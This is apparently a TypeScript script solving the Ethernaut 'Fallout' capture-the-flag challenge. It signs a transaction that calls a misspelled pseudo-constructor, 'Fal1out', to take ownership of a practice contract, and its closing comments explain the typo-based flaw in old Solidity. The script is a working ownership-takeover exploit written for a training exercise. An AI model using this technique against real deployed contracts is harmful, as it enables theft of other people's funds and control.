import dotenv from "dotenv";

dotenv.config();
import { ethers } from "hardhat";

const contractAddress = "0x31C499b0C6f7d5736486F7eCF39A2972A6A64ae6";

import { abi } from "../abi/Fallout.json";

const provider = new ethers.JsonRpcProvider(process.env.ALCHEMY_API_KEY_URL);

//@ts-ignore
const signer = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

const main = async () => {
  console.log("Starting...");

  console.log("Signer address:", signer.address);

  const contract = new ethers.Contract(contractAddress, abi, signer);

  console.log("Contract address:", contract.target);

  // call Fal1out function
  const tx = await contract.Fal1out();
  await tx.wait();

  // check if the contract is now owned by the signer
  console.log("New owner:", await contract.owner());

  console.log("Success");
};

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

// This challenge tests the player's knowledge about how constructors work in solidity 0.60 and
// the player's attention to detail.

// The goal of this challenge is to take over the contract and become the new owner.

// Upon reading through the contract, we will discover that we can do one thing:

// Call the Fal1out() function
//   In the earlier versions of solidity, there was no constructor functions and
// the way to write constructor is to use the same name of the contract to write a function and
//  this function only runs once.
// Unfortunately in the above contract there was a typo in the function that looks like the name of the contract`Fal1out`, the name should have been Fallout.The implication of this error means that we can call the Fal1out function and the logic inside the function will make the player the new owner.
